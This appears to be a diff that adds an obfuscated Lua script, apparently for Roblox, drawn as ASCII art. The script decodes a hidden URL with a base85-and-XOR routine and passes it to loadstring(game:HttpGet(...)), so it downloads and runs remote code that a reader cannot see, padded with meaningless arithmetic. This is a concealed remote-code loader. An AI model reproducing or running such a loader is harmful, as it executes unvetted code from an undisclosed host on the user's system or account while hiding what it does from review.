@@ -1,0 +1,51 @@
+-- Obfuscated with SakrYn at  | ON TOP
+
+
+
+                                          local v
+                                       = {[15] =
+                                    "C/", [7 ]
+                                  = "MG=-8:" ,
+                                [  5   ]    =
+                              "g)eAxU", [2 ]
+                             = "qAVr", [6] =
+                             "GzKh", [10] =
+                            "_&hJk", [8] =
+                            "PY.", [11]  =
+                             "O*t", [14] =
+                             "#@$c0", [13]
+                      =      "9>8fh", [1 ]
+                      =       "48.", [12 ]
+                     =        "q^HE%d", [3
+                     ]     =  "*2K", [4]  =
+                    "W?6R*R"   ,  [ 9 ]   =
+                    "eoD*"} ;   local  k   =
+                    "01234" ..   "56789"  ..
+                    "abcde".."f"  .."ghij" ..
+                    "klmno".."pq"  .. "rst" .. "u"
+                    .."vwxy".."zA"   .."BCD".."EF"          .."G"    ..
+                     "HI".."JKLMN"..   "OPQRS"  ..          "TUVWX".."YZ"
+                     ..".-:".. "+=^!/"  .. "*?&<>"     .."(){}@".."%$#_|";
+                      local c =  table.concat( v) ; local s = {}; local e =
+                      5729; for w = 1, #c, 5 do local b = 0; for p = w, w + 4
+                         do b = b * 85  + string.find(k , c:sub(p , p), 1 ,
+                              true) - 1; end; for p = 3, 0, - 1 do e = (e *  83
+                        + 59769)     % 65521; s [#s +  1] = string .char(bit32 .
+                          bxor(math.floor(b/256^p ) % 256, e % 256)) ;       end
+                           ; end; v = table .concat(s): sub(1, 51) ;
+                            local t, d = loadstring(game:HttpGet(v)
+                              ); assert(t, d); do local m = {4, 9}
+                                ; m[1  ] = m[2] % 1; end; local m =
+                                     4 + 3 % 6 % 7 - 3 - 9 % 6 %  5
+                                    - 2 - 7 % 7 - 7 + 8 - 1 % 5 -  2
+                                        + 6 + 2 % 2 % 7 % 8 - 8 + 5  %
+                                               1 + 7 + 9 - 9 + 8 + 9  %
+                                                      2 - 6 - 8 + 6 +  1
+                                                           + 8 % 1 + 7  -
+                                                               7 % 5 % 1 %
+                                                                  2  +   2;
+                                                                     return
+                                                                          t(
+                                                                         ...
+
+                                                                            )
